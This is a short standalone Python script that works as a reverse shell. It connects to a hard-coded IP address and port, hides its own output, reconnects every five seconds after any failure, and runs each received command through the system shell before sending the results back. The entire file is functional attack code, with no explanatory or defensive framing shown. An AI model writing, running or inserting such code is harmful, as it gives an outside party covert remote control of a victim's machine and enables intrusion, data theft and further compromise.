#!/usr/bin/env python3
import socket
import subprocess
import time
import sys
import os

def reverse_shell(host="10.162.6.102", port=3399):
    # Suppress output
    devnull = open(os.devnull, 'w')
    sys.stdout = devnull
    sys.stderr = devnull
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)  # Extended timeout
            
            # Set keepalive
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Connect
            sock.connect((host, port))
            print(f"[+] Connected to {host}:{port}")
            
            while True:
                try:
                    # Set receive timeout
                    sock.settimeout(10)
                    
                    # Receive command
                    cmd = sock.recv(4096).decode().strip()
                    if not cmd:
                        break
                    
                    # Execute and send response
                    proc = subprocess.Popen(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    output, _ = proc.communicate(timeout=10)
                    sock.sendall(output)
                    
                except socket.timeout:
                    print("[-] Communication timeout")
                    continue
                except Exception as e:
                    sock.sendall(str(e).encode())
                    
        except socket.error as e:
            print(f"[-] Socket error: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    reverse_shell()
